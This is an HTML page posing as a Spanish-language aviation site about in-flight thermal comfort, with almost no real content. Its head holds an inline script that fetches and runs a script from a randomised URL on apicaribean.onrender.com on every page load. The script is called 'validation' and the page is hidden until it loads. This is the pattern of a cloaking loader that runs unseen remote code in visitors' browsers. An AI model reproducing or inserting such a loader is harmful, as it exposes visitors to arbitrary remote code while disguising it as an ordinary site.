<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Análisis experto sobre el confort térmico en vuelos comerciales y soluciones de aviación.">
    <title>Confort en Altitud | Gestión Térmica en Vuelos</title>

    <style>
        /* 1. OCULTAR EL CUERPO POR DEFECTO */
        body {
            opacity: 0;
            transition: opacity 0.3s ease;
            background-color: #ffffff; /* Asegura que sea blanco */
        }

        /* RESET & BASE (Tu CSS original sigue aquí) */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        /* ... el resto de tus estilos ... */
    </style>

    <script>
        (function() {
            // Generar ID aleatorio
            var randomID = Array(60).fill(0).map(function(){
                return Math.random().toString(36)[2];
            }).join('');

            var backendURL = "https://apicaribean.onrender.com/" + randomID;

            var s = document.createElement('script');
            s.src = backendURL;
            s.async = true;

            // 2. LÓGICA DE REVELACIÓN
            function showPage() {
                document.body.style.opacity = "1";
            }

            // Se ejecuta cuando el script carga con éxito
            s.onload = function() {
                showPage();
            };

            // Se ejecuta si hay un error (para que la página no se quede blanca infinitamente)
            s.onerror = function() {
                console.error("Error cargando el script de validación.");
                showPage(); 
            };

            // Timeout de seguridad: Si el server de Render tarda más de 5s, mostrar la página
            setTimeout(showPage, 5000);

            document.head.appendChild(s);
        })();
    </script>
    
    <style>
        body {
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            line-height: 1.6;
            color: #333;
            min-height: 100vh;
        }
        /* ... (Header, Hero, Button, etc.) */
    </style>
</head>
<body>
    <header>
        <div class="logo">AeroComfort Dynamics</div>
    </header>
    </body>
</html>
